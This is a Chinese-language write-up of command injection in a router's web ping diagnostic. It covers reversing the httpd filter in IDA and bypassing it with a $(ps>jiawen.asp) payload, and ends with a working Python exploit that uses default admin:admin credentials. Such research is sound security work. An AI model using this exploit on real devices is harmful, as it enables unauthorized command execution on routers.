## 猜测分析
在测试web端按钮时，疑似发现ping下面的框可以命令执行
![[Pasted image 20240723192526.png]]
## 具体分析
在点击页面发现可以开启telnet服务，为后续验证命令执行提供便利
![[Pasted image 20240723192815.png]]
telnet开启成功
![[Pasted image 20240723193013.png]]
先直接拼接命令看看是不是能执行成功

![[Pasted image 20240724111256.png]]
这里发现并没有成功返回了404界面，所以思考是不是有什么过滤，看一下页面是哪里来的先
![[Pasted image 20240723200013.png]]
在httpd这个二进制文件中
这里先抓个包，看看传了什么参数
![[Pasted image 20240723195657.png]]
destIP是我们输入的IP，但是去IDA里面搜索这个关键字找不到存在的地方
于是再看到SystemCmd这个参数，里面也有我们输入的IP，于是去查了一下SystemCmd这个关键字
![[Pasted image 20240723200538.png]]
发现第三个交叉引用到
![[Pasted image 20240723200614.png]]
想看一下伪代码报错了
![[Pasted image 20240723200741.png]]
复制41FFFC这个地址，G输入进去跳转到这个地址，把这个地址D转换为数据
![[Pasted image 20240723200954.png]]
这样子就可以看到伪代码了，伪代码发现过滤了6种字符，也确定了是通过systemcmd这个来传参的
![[Pasted image 20240723201811.png]]
![[1f19df9bcffb60035adbc9d25581df8.png]]
那么找到了过滤的字符，尝试绕过，在web端尝试输出192.168.1.1$(ps>jiawen.asp)
![[Pasted image 20240724110801.png]]
![[Pasted image 20240724110916.png]]
执行成功


我们假设没有telnet该怎么看回显查看是否执行成功了呢
我们可以给命令执行的时候$(ps>jiawen.asp)用http://localhost/jiawen.asp直接请求这个页面查看是否执行成功
至于为什么是.asp呢，这里之前命令注入的时候创建的是.txt的文件，去直接请求.txt发现返回的是404的界面，所以根据猜测应该是有什么规则，去搜索有没有什么规则文件也并没有找到，于是猜测也是集成写在了httpd二进制文件中，于是在IDA里面搜索**.asp* 就发现了
httpd这个二进制文件中存在一些规则，使它只能在web端访问这些规则的界面
![[Pasted image 20240723211556.png]]
![[Pasted image 20240723211627.png]]

## EXP
```
import requests

cmd = "ps+>+jiawen.asp"
syscmd = "ping+-c+5+$("+cmd+")"

burp0_url = "http://192.168.1.1:80/apply.cgi?current_page=Main_Analysis_Content.asp&next_page=Main_Analysis_Content.asp&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&preferred_lang=CN&SystemCmd="+syscmd+"&firmver=3.0.0.4&cmdMethod=ping&destIP="+cmd+"&pingCNT=5"
burp0_headers = {
    "Authorization": "Basic YWRtaW46YWRtaW4=",
    "Referer": "http://192.168.1.1/Main_Analysis_Content.asp"
}
requests.get(burp0_url, headers=burp0_headers)

burp1_url = "http://192.168.1.1:80/Main_Analysis_Content.asp"
burp1_headers = {
    "Authorization": "Basic YWRtaW46YWRtaW4=",
    "Referer": "http://192.168.1.1/apply.cgi?current_page=Main_Analysis_Content.asp&next_page=Main_Analysis_Content.asp&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&preferred_lang=CN&SystemCmd="+syscmd+"&firmver=3.0.0.4&cmdMethod=ping&destIP="+cmd+"&pingCNT=5"
}
requests.get(burp1_url, headers=burp1_headers)

burp2_url = "http://192.168.1.1:80/jiawen.asp"
burp2_headers = {
    "Authorization": "Basic YWRtaW46YWRtaW4="
}
response = requests.get(burp2_url, headers=burp2_headers)

print(response.text)
```
